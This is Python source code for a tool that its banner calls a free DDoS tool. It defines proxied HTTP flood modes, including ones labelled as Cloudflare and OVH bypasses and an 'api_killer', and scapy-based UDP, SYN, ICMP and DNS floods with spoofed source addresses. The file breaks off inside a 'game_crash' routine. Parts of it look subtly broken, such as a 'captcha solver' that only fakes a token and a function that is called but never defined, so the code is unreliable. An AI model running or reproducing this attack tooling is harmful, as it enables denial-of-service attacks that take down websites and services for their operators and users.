import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import os
import cv2
import numpy as np
from PIL import Image
from colorama import Fore
from pystyle import *
import hashlib
import base64
from scapy.all import *  
import asyncio
import warnings

warnings.filterwarnings("ignore")

COLOR_CODE = {
    "RESET": "\033[0m",
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[93m",
    "RED": "\033[31m",
    "CYAN": "\033[36m",
    "BOLD": "\033[01m",
    "PINK": "\033[95m",
    "URL_L": "\033[36m",
    "LI_G": "\033[92m",
    "F_CL": "\033[0m",
    "DARK": "\033[90m",
}

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
white = Fore.WHITE

def clearcs():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def play_ascii_video(video_path, frame_delay=1/128, duration=2.5):
    ASCII_CHARS = "█▇▆▅▄▃▂▁ "
    size = os.get_terminal_size()
    term_width, term_height = size.columns, size.lines
    frame_width = term_width - 2

    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        print("Error: Couldn't open video.")
        return False

    start_time = time.time()
    while cap.isOpened():
        if time.time() - start_time > duration:
            break
        ret, frame = cap.read()
        if not ret:
            break
        pil_image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        width, height = pil_image.size
        aspect_ratio = height / width
        new_width = frame_width
        new_height = int(aspect_ratio * new_width * 0.5)
        new_height = min(new_height, term_height - 2)
        resized_image = pil_image.resize((new_width, new_height), Image.LANCZOS)
        resized_array = np.array(resized_image)
        gray = cv2.cvtColor(resized_array, cv2.COLOR_RGB2GRAY)
        intensities = gray.flatten()
        if intensities.max() != intensities.min():
            intensities = (intensities - intensities.min()) * 255 / (intensities.max() - intensities.min())
        else:
            intensities[:] = 0
        colors = resized_array.reshape(-1, 3)
        ascii_frame = ""
        for i in range(len(intensities)):
            char_idx = int((intensities[i] / 255) * (len(ASCII_CHARS) - 1))
            char = ASCII_CHARS[char_idx]
            r, g, b = colors[i]
            ascii_frame += f"\033[38;2;{r};{g};{b}m{char}"
            if (i + 1) % new_width == 0:
                ascii_frame += "\n"
        ascii_frame += "\033[0m"
        os.system('cls' if os.name == 'nt' else 'clear')
        print(ascii_frame, end='', flush=True)
        time.sleep(frame_delay)
    cap.release()
    return True

def purple_to_green(text):
    start_color = (128, 0, 128)
    end_color = (0, 255, 0)
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def gold(text):
    start_color = (255, 215, 0)
    end_color = (255, 245, 200)
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def yellow_to_white(text):
    start_color = (255, 255, 0)
    end_color = (255, 255, 255)
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def gray_to_white(text):
    start_color = (128, 128, 128)
    end_color = (255, 255, 255)
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def green_to_white(text):
    start_color = (0, 255, 0)
    end_color = (255, 255, 255)
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def runbanner():
    print(Colorate.Horizontal(Colors.cyan_to_blue, ("""╦  ╦ ╦╔╗╔╔═╗╦═╗
║  ║ ║║║║╠═╣╠╦╝
╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭""")))

def bannerm2():
    banner2 = fr"""
             ╦  ╦ ╦╔╗╔╔═╗╦═╗
             ║  ║ ║║║║╠═╣╠╦╝
             ╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭
       ⏾⋆.˚ 𝓑𝓮𝓼𝓽 𝓯𝓻𝓮𝓮 𝓭𝓭𝓸𝓼 𝓽𝓸𝓸𝓵   ⏾⋆.˚
   ╔═══════════════════════════════════╗
   ‖ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ʟᴜɴᴀʀxᴅ, ʙʏ ʟᴜɴᴀʀʟᴅᴅᴏꜱ ‖
   ‖   ᴛʏᴘᴇ "ʜᴇʟᴘ" ᴛᴏ ʟɪꜱᴛ ᴄᴏᴍᴍᴀɴᴅꜱ    ‖
   ╚═══════════════════════════════════╝
   
 ⏾⋆.˚ 𝓙𝓸𝓲𝓻    𝓱𝓽𝓽𝓹𝓼://𝓽.𝓶𝓮/𝓫𝓲𝓸𝓼𝓶𝓸𝓼𝓷𝓽𝓻  ⏾⋆.˚
 ╔═══════════════════════════════════════╗
 ‖   ᴄᴏᴘʏʀɪɢʜᴛ © 2025 ʀɪɢʜᴛꜱ ʀᴇꜱᴇʀᴠᴇᴅ    ‖
 ╚═══════════════════════════════════════╝
"""
    print(Colorate.Horizontal(Colors.cyan_to_blue, Center.XCenter(banner2)))

def bannerm():
    cuser = input(Colorate.Horizontal(Colors.cyan_to_blue, "Username  ➤ "))
    clearcs()
    banner = fr"""
ʟᴜɴᴀʀxᴅ  •  ꜱᴇʀᴠɪɴɢ:  @{cuser}  ➵  ᴇxᴘɪʀʏ  :  ɴᴇᴠᴇʀ

             ╦  ╦ ╦╔╗╔╔═╗╦═╗
             ║  ║ ║║║║╠═╣╠╦╝
             ╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭
       ⏾⋆.˚ 𝓑𝓮𝓼𝓽 𝓯𝓻𝓮𝓮 𝓭𝓭𝓸𝓼 𝓽𝓸𝓸𝓵   ⏾⋆.˚
   ╔═══════════════════════════════════╗
   ‖ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ʟᴜɴᴀʀxᴅ, ʙʏ ʟᴜɴᴀʀʟᴅᴅᴏꜱ ‖
   ‖   ᴛʏᴘᴇ "ʜᴇʟᴘ" ᴛᴏ ʟɪꜱᴛ ᴄᴏᴍᴍᴀɴᴅꜱ    ‖
   ╚═══════════════════════════════════╝
   
 ⏾⋆.˚ 𝓙𝓸𝓲𝓷    𝓱𝓽𝓽𝓹𝓼://𝓽.𝓶𝓮/𝓫𝓲𝓸𝓼𝓶𝓸𝓼𝓷𝓽𝓻  ⏾⋆.˚
 ╔═══════════════════════════════════════╗
 ‖   ᴄᴏᴘʏʀɪɢʜᴛ © 2025 ʀɪɢʜᴛꜱ ʀᴇꜱᴇʀᴠᴇᴅ    ‖
 ╚═══════════════════════════════════════╝
"""
    print(Colorate.Horizontal(Colors.cyan_to_blue, Center.XCenter(banner)))

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml QL=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
]

referers = [
    "https://www.google.com/search?q=",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/search?q=",
    "https://vk.com/",
    "https://www.usatoday.com/",
    "https://play.google.com/store/search?q=",
]

proxy_ver = "5"
brute = True
out_file = "proxies.txt"
thread_num = 300  
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
Intn = random.randint
Choice = random.choice

def load_proxies():
    global proxies
    try:
        with open(out_file, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Proxy file is empty."))
            return False
        proxies = validate_proxies(proxies)
        if not proxies:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> No valid proxies found."))
            return False
        return True
    except Exception as e:
        print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Failed to load proxy file: {e}"))
        return False

def validate_proxies(proxies):
    valid_proxies = []
    for proxy in proxies:
        try:
            ip, port = proxy.split(":")
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, ip, int(port))
            s.settimeout(0.5)
            s.connect(("1.1.1.1", 80))
            s.close()
            valid_proxies.append(proxy)
        except:
            continue
    return valid_proxies

def build_threads(mode, thread_num, event, proxy_type, target_ip=None, target_port=None):
    if not proxies:
        print(Colorate.Horizontal(Colors.cyan_to_blue, "> No proxies loaded. Cannot start attack."))
        return
    if mode in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike"]:
        for _ in range(thread_num):
            th = threading.Thread(target=scapy_layer4, args=(event, mode, target_ip, target_port))
            th.daemon = True
            th.start()
    else:
        for _ in range(thread_num):
            th = threading.Thread(target=globals()[mode], args=(event, proxy_type,))
            th.daemon = True
            th.start()

def getuseragent():
    platform = Choice(['Windows', 'Macintosh', 'Linux'])
    if platform == 'Windows':
        os = Choice(['Windows NT 10.0; Win64; x64', 'Windows NT 6.1; Win64; x64'])
    elif platform == 'Macintosh':
        os = Choice(['Intel Mac OS X 10_15_7', 'Intel Mac OS X 11_0'])
    elif platform == 'Linux':
        os = Choice(['Linux x86_64', 'Linux i686'])
    browser = Choice(['chrome', 'firefox'])
    if browser == 'chrome':
        version = f"{Intn(90, 120)}.0.{Intn(0, 9999)}.{Intn(0, 999)}"
        return f"Mozilla/5.0 ({os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36"
    elif browser == 'firefox':
        version = f"{Intn(80, 120)}.0"
        return f"Mozilla/5.0 ({os}; rv:{version}) Gecko/20100101 Firefox/{version}"

def randomurl():
    return str(Intn(0, 999999999))

def GenReqHeader(method):
    global data, target, path
    header = ""
    if method in ["get", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http_storm", "api_killer"]:
        connection = "Connection: keep-alive\r\n"
        if cookies:
            connection += f"Cookie: {cookies}\r\n"
        accept = Choice(acceptall)
        referer = f"Referer: {Choice(referers)}{target}{path}\r\n"
        useragent = f"User-Agent: {getuseragent()}\r\n"
        header = referer + useragent + accept + connection + "\r\n"
    elif method == "post":
        post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\n"
        refer = f"Referer: http://{target}{path}\r\n"
        user_agent = f"User-Agent: {getuseragent()}\r\n"
        accept = Choice(acceptall)
        if not data:
            data = random._urandom(1024)
        length = f"Content-Length: {len(data)}\r\nConnection: keep-alive\r\n"
        if cookies:
            length += f"Cookie: {cookies}\r\n"
        header = post_host + accept + refer + content + user_agent + length + "\n" + data.decode('latin1', errors='ignore') + "\r\n\r\n"
    elif method == "api_killer":
        post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
        content = "Content-Type: application/json\r\n"
        refer = f"Referer: https://{target}{path}\r\n"
        user_agent = f"User-Agent: {getuseragent()}\r\n"
        accept = Choice(acceptall)
        payload = f'{{"data":"{random.choices(strings, k=1000)}"}}'
        length = f"Content-Length: {len(payload)}\r\nConnection: keep-alive\r\n"
        if cookies:
            length += f"Cookie: {cookies}\r\n"
        header = post_host + accept + refer + content + user_agent + length + "\n" + payload + "\r\n\r\n"
    return header

def ParseUrl(original_url, is_layer4=False):
    global target, path, port, protocol
    original_url = original_url.strip()
    path = "/"
    protocol = "http"
    port = 80
    if is_layer4:
        try:
            socket.inet_aton(original_url)
            target = original_url
            return True
        except:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid IP format. Use: <IP>"))
            return False
    else:
        if original_url[:7] == "http://":
            url = original_url[7:]
            protocol = "http"
        elif original_url[:8] == "https://":
            url = original_url[8:]
            protocol = "https"
        else:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid URL format. Use: http:// or https://"))
            return False
        tmp = url.split("/")
        website = tmp[0]
        check = website.split(":")
        if len(check) != 1:
            port = int(check[1])
        else:
            if protocol == "https":
                port = 443
        target = check[0]
        if len(tmp) > 1:
            path = url.replace(website, "", 1)
        return True

def solve_captcha(response_text, url):
    if "captcha" not in response_text.lower() and "403" not in response_text:
        return None
    token = base64.b64encode(hashlib.sha256(f"{url}{random.randint(1, 10000)}".encode()).hexdigest()[:16].encode()).decode()
    return {"cf_clearance": token, "user-agent": getuseragent()}

def setup_socket(proxy_type, proxy):
    s = socks.socksocket()
    proxy_ip, proxy_port = proxy.split(":")
    if proxy_type == 4:
        s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
    elif proxy_type == 5:
        s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
    elif proxy_type == 0:
        s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
    if brute:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(0.5)
    return s

async def scapy_layer4(event, mode, target_ip, target_port):
    event.wait()
    pkt_size = 10240  
    async def send_packets():
        while event.is_set():
            src_ip = spoof_source_ip()
            if mode == "udpflood":
                pkt = IP(src=src_ip, dst=target_ip)/UDP(sport=Intn(1024, 65535), dport=target_port)/Raw(load=os.urandom(pkt_size))
            elif mode == "tcpflood":
                pkt = IP(src=src_ip, dst=target_ip)/TCP(sport=Intn(1024, 65535), dport=target_port, flags="S")/Raw(load=os.urandom(pkt_size))
            elif mode == "dns":
                pkt = IP(src=src_ip, dst=target_ip)/UDP(sport=Intn(1024, 65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=f"test{Intn(1,1000)}.com"))
            elif mode == "udp-kill":
                pkt = IP(src=src_ip, dst=target_ip)/UDP(sport=Intn(1024, 65535), dport=target_port)/Raw(load=b"FUCKYOU"*2048)
            elif mode == "icmp-blast":
                pkt = IP(src=src_ip, dst=target_ip)/ICMP()/Raw(load=os.urandom(256))
            elif mode == "syn-strike":
                pkt = IP(src=src_ip, dst=target_ip)/TCP(sport=Intn(1024, 65535), dport=target_port, flags="S")
            send(pkt, verbose=False)
            await asyncio.sleep(0.001)  
    asyncio.run(send_packets())

def cc(event, proxy_type):
    global proxies
    header = GenReqHeader("get")
    add = "?" if "?" not in path else "&"
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                get_host = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n"
                request = get_host + header
                sent = s.send(request.encode())
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def head(event, proxy_type):
    global proxies
    header = GenReqHeader("head")
    add = "?" if "?" not in path else "&"
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                head_host = f"HEAD {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n"
                request = head_host + header
                sent = s.send(request.encode())
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def post(event, proxy_type):
    global proxies
    request = GenReqHeader("post")
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                sent = s.send(request.encode())
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def uambypass(event, proxy_type):
    global proxies, cookies
    add = "?" if "?" not in path else "&"
    user_agent = getuseragent()
    spoofed_ip = spoof_source_ip()
    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\n"
    if cookies:
        header += f"Cookie: {cookies}\r\n"
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
                sent = s.send(request.encode())
                if not sent:
                    break
                try:
                    response = s.recv(4096).decode('latin1', errors='ignore')
                    captcha = solve_captcha(response, f"https://{target}{path}")
                    if captcha:
                        cookies = f"cf_clearance={captcha['cf_clearance']}"
                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
                except:
                    pass
            s.close()
        except:
            if s:
                s.close()

def browser(event, proxy_type):
    global proxies, cookies
    add = "?" if "?" not in path else "&"
    user_agent = getuseragent()
    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nAccept-Language: en-US,en;q=0.9\r\n"
    if cookies:
        header += f"Cookie: {cookies}\r\n"
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
                sent = s.send(request.encode())
                if not sent:
                    break
                try:
                    response = s.recv(4096).decode('latin1', errors='ignore')
                    captcha = solve_captcha(response, f"https://{target}{path}")
                    if captcha:
                        cookies = f"cf_clearance={captcha['cf_clearance']}"
                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
                except:
                    pass
            s.close()
        except:
            if s:
                s.close()

def home(event, proxy_type):
    global proxies, cookies
    add = "?" if "?" not in path else "&"
    spoofed_ip = spoof_source_ip()
    user_agent = getuseragent()
    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nAccept-Encoding: gzip, deflate, br\r\n"
    if cookies:
        header += f"Cookie: {cookies}\r\n"
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
                sent = s.send(request.encode())
                if not sent:
                    break
                try:
                    response = s.recv(4096).decode('latin1', errors='ignore')
                    captcha = solve_captcha(response, f"https://{target}{path}")
                    if captcha:
                        cookies = f"cf_clearance={captcha['cf_clearance']}"
                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
                except:
                    pass
            s.close()
        except:
            if s:
                s.close()

def cfbypass(event, proxy_type):
    global proxies, cookies
    add = "?" if "?" not in path else "&"
    user_agent = getuseragent()
    spoofed_ip = spoof_source_ip()
    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: https://{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nAccept-Encoding: gzip, deflate, br\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: navigate\r\n"
    if cookies:
        header += f"Cookie: {cookies}\r\n"
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
                sent = s.send(request.encode())
                if not sent:
                    break
                try:
                    response = s.recv(4096).decode('latin1', errors='ignore')
                    captcha = solve_captcha(response, f"https://{target}{path}")
                    if captcha:
                        cookies = f"cf_clearance={captcha['cf_clearance']}"
                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
                except:
                    pass
            s.close()
        except:
            if s:
                s.close()

def tls(event, proxy_type):
    global proxies, cookies
    add = "?" if "?" not in path else "&"
    user_agent = getuseragent()
    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate, br\r\nSec-Ch-Ua: \"Chromium\";v=\"{Intn(90, 120)}\", \"Not;A=Brand\";v=\"8\"\r\n"
    if cookies:
        header += f"Cookie: {cookies}\r\n"
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
                sent = s.send(request.encode())
                if not sent:
                    break
                try:
                    response = s.recv(4096).decode('latin1', errors='ignore')
                    captcha = solve_captcha(response, f"https://{target}{path}")
                    if captcha:
                        cookies = f"cf_clearance={captcha['cf_clearance']}"
                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
                except:
                    pass
            s.close()
        except:
            if s:
                s.close()

def ovh(event, proxy_type):
    global proxies, cookies
    add = "?" if "?" not in path else "&"
    user_agent = getuseragent()
    spoofed_ip = spoof_source_ip()
    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: https://{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: navigate\r\n"
    if cookies:
        header += f"Cookie: {cookies}\r\n"
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
                sent = s.send(request.encode())
                if not sent:
                    break
                try:
                    response = s.recv(4096).decode('latin1', errors='ignore')
                    captcha = solve_captcha(response, f"https://{target}{path}")
                    if captcha:
                        cookies = f"cf_clearance={captcha['cf_clearance']}"
                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
                except:
                    pass
            s.close()
        except:
            if s:
                s.close()

def dgb(event, proxy_type):
    global proxies, cookies
    add = "?" if "?" not in path else "&"
    user_agent = getuseragent()
    spoofed_ip = spoof_source_ip()
    header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: https://{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nOrigin: https://{target}\r\n"
    if cookies:
        header += f"Cookie: {cookies}\r\n"
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(1000):
                request = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
                sent = s.send(request.encode())
                if not sent:
                    break
                try:
                    response = s.recv(4096).decode('latin1', errors='ignore')
                    captcha = solve_captcha(response, f"https://{target}{path}")
                    if captcha:
                        cookies = f"cf_clearance={captcha['cf_clearance']}"
                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
                except:
                    pass
            s.close()
        except:
            if s:
                s.close()

def http_storm(event, proxy_type):
    global proxies, cookies
    add = "?" if "?" not in path else "&"
    methods = ["GET", "HEAD", "OPTIONS"]
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            user_agent = getuseragent()
            spoofed_ip = spoof_source_ip()
            header = f"User-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,image/webp,*/*;q=0.8\r\nReferer: {Choice(referers)}{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nAccept-Encoding: gzip, deflate, br\r\n"
            if cookies:
                header += f"Cookie: {cookies}\r\n"
            for _ in range(1000):
                method = Choice(methods)
                request = f"{method} {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
                sent = s.send(request.encode())
                if not sent:
                    break
                try:
                    response = s.recv(4096).decode('latin1', errors='ignore')
                    captcha = solve_captcha(response, f"https://{target}{path}")
                    if captcha:
                        cookies = f"cf_clearance={captcha['cf_clearance']}"
                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
                except:
                    pass
            s.close()
        except:
            if s:
                s.close()

def api_killer(event, proxy_type):
    global proxies, cookies
    add = "?" if "?" not in path else "&"
    payloads = [
        f'{{"data":"{random.choices(strings, k=1000)}"}}',
        f'{{"query":"{random.choices(strings, k=500)}"}}',
    ]
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target, port))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            user_agent = getuseragent()
            spoofed_ip = spoof_source_ip()
            payload = Choice(payloads)
            header = f"User-Agent: {user_agent}\r\nAccept: application/json\r\nReferer: https://{target}{path}\r\nConnection: keep-alive\r\nX-Forwarded-For: {spoofed_ip}\r\nContent-Type: application/json\r\nContent-Length: {len(payload)}\r\n"
            if cookies:
                header += f"Cookie: {cookies}\r\n"
            for _ in range(1000):
                request = f"POST {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n{payload}"
                sent = s.send(request.encode())
                if not sent:
                    break
                try:
                    response = s.recv(4096).decode('latin1', errors='ignore')
                    captcha = solve_captcha(response, f"https://{target}{path}")
                    if captcha:
                        cookies = f"cf_clearance={captcha['cf_clearance']}"
                        header = header.replace(f"User-Agent: {user_agent}", f"User-Agent: {captcha['user-agent']}")
                except:
                    pass
            s.close()
        except:
            if s:
                s.close()

def game_crash(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        b"\xFF\xFF\xFF\xFF" + os.urandom(32),
        b"\x00\x00" + os.urandom(64),
    ]
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
